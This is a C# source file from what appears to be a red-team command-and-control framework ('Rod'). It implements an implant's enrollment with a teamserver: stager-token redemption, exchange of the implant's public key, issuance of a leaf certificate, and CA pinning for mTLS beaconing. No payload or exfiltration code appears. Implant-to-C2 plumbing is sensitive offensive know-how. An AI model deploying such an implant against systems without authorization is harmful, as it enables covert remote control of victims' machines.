using System.Net.Http.Json;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text.Json.Serialization;

namespace Rod.Implant.Internal;

// Holds the reference implant's teamserver-facing clients: the enroll client
// (this file) and the mTLS beacon client (Beacon.cs). They speak the Rod wire
// protocol and the JSON enroll contract; nothing here is implant-only
// tradecraft -- the same shapes are what any Rod implant of any language sends.

/// <summary>
/// Mirrors the wire rod.v1.EnrollStatus (architecture.md Sec 9). Kept as an int
/// here rather than imported from the generated bindings, because enroll is plain
/// JSON over HTTP (not the protobuf stream) and the enum is the only contract
/// shared with the JSON body.
/// </summary>
internal enum EnrollStatus
{
    Unspecified = 0,
    Ok = 1,
    BadToken = 2,
    Expired = 3,
    Spent = 4,
}

// The JSON body of POST /implants/enroll. PublicKey is the implant's own
// SubjectPublicKeyInfo, base64 over JSON; the teamserver signs a leaf over it so
// the implant keeps its private key (architecture.md Sec 9).
internal sealed class EnrollRequest
{
    [JsonPropertyName("stagerTokenSecret")]
    public string StagerTokenSecret { get; set; } = string.Empty;

    [JsonPropertyName("class")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? Class { get; set; }

    [JsonPropertyName("publicKey")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? PublicKey { get; set; }
}

// Mirrors the teamserver's EnrollmentResponse: the issued leaf and CA chain,
// base64 over JSON, with the wire status. On a non-OK status the cert fields are
// empty.
internal sealed class EnrollResponse
{
    [JsonPropertyName("status")]
    public EnrollStatus Status { get; set; }

    [JsonPropertyName("implantId")]
    public string? ImplantId { get; set; }

    [JsonPropertyName("engagementId")]
    public string? EngagementId { get; set; }

    [JsonPropertyName("leafCertificate")]
    public string? LeafCertificate { get; set; }

    [JsonPropertyName("caChain")]
    public string[]? CaChain { get; set; }
}

/// <summary>
/// The result of a successful enroll: the implant's identity, its engagement,
/// the leaf certificate paired with its private key (so it can be presented in
/// mTLS), and the CA chain to trust as the server identity.
/// </summary>
internal sealed class Enrollment
{
    public string ImplantId { get; init; } = string.Empty;
    public string EngagementId { get; init; } = string.Empty;

    /// <summary>
    /// The issued leaf certificate paired with the implant's private key, ready
    /// to present as a TLS client certificate.
    /// </summary>
    public X509Certificate2 Leaf { get; init; } = null!;

    /// <summary>The leaf's private key (the implant's own RSA key).</summary>
    public RSA PrivateKey { get; init; } = null!;

    /// <summary>
    /// The teamserver CA(s), trusted as the mTLS server identity and used to
    /// validate the leaf's chain at enroll.
    /// </summary>
    public IReadOnlyList<X509Certificate2> CAs { get; init; } = Array.Empty<X509Certificate2>();
}

/// <summary>
/// The enroll client. Redeems the stager token at the teamserver, sending the
/// implant's own public key, and returns the bound leaf paired with the private
/// key. The implant owns its private key throughout; only the public half
/// crosses the wire (architecture.md Sec 9). <paramref name="serverCAs"/> pins
/// which server identity to accept over the enroll TLS connection (empty trusts
/// the system roots).
/// </summary>
internal static class C2
{
    public static async Task<Enrollment> EnrollAsync(
        string enrollUrl,
        string stagerToken,
        RSA privateKey,
        X509Certificate2Collection? serverCAs,
        CancellationToken cancellationToken = default)
    {
        // Export the public half as a DER SubjectPublicKeyInfo -- exactly what
        // EnrollmentEndpoints reads back via ImportSubjectPublicKeyInfo.
        var pubSpki = privateKey.ExportSubjectPublicKeyInfo();
        var body = new EnrollRequest
        {
            StagerTokenSecret = stagerToken,
            PublicKey = Convert.ToBase64String(pubSpki),
        };

        using var handler = new HttpClientHandler();
        if (serverCAs is { Count: > 0 })
        {
            handler.ServerCertificateCustomValidationCallback = (message, cert, chain, errors) =>
                PinServerChain(cert, chain, serverCAs);
        }
        using var http = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) };

        using var response = await http.PostAsJsonAsync(enrollUrl, body, cancellationToken);
        // The teamserver returns 200 on OK and 401 on a token failure, both with
        // an EnrollmentResponse body. Read the body either way.
        var er = await response.Content.ReadFromJsonAsync<EnrollResponse>(cancellationToken: cancellationToken)
            ?? throw new InvalidOperationException("enroll returned an empty body");
        if (er.Status != EnrollStatus.Ok)
            throw new InvalidOperationException($"enroll rejected: status {er.Status}");

        var leafDer = Convert.FromBase64String(er.LeafCertificate
            ?? throw new InvalidOperationException("enroll OK but missing leafCertificate"));
        // .NET 10 obsoleted the X509Certificate2(byte[]) ctor (SYSLIB0057); the
        // loader is the supported path for parsing a DER cert.
        var leaf = X509CertificateLoader.LoadCertificate(leafDer);
        // Pair the issued leaf with the implant's own private key (the teamserver
        // signed over the public half; the private half never left the implant).
        var paired = leaf.CopyWithPrivateKey(privateKey);

        var cas = new List<X509Certificate2>();
        if (er.CaChain is { } caChain)
        {
            foreach (var b64 in caChain)
            {
                var der = Convert.FromBase64String(b64);
                cas.Add(X509CertificateLoader.LoadCertificate(der));
            }
        }

        return new Enrollment
        {
            ImplantId = er.ImplantId ?? string.Empty,
            EngagementId = er.EngagementId ?? string.Empty,
            Leaf = paired,
            PrivateKey = privateKey,
            CAs = cas,
        };
    }

    // Accepts the peer certificate iff it chains to one of the pinned CAs. The
    // dev teamserver presents the CA certificate itself as its server identity
    // (TransportHost.ConfigureMtlsHttps), and that CA cert carries no Subject
    // Alternative Names -- standard TLS name verification would reject it. The
    // implant pins the CA explicitly, so the security property is
    // chain-to-pinned-CA, not DNS name match -- the same shape the C# beacon
    // client and the Go implant use.
    private static bool PinServerChain(
        X509Certificate2? certificate,
        X509Chain? chain,
        X509Certificate2Collection pinned)
    {
        if (certificate is null || chain is null)
            return false;
        chain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
        chain.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
        foreach (X509Certificate2 ca in pinned)
            chain.ChainPolicy.ExtraStore.Add(ca);
        if (!chain.Build(certificate))
            return false;
        // The chain must terminate at one of the pinned CAs, not some other root.
        if (chain.ChainElements.Count == 0)
            return false;
        var root = chain.ChainElements[^1].Certificate;
        foreach (X509Certificate2 ca in pinned)
            if (root.Thumbprint == ca.Thumbprint)
                return true;
        return false;
    }
}
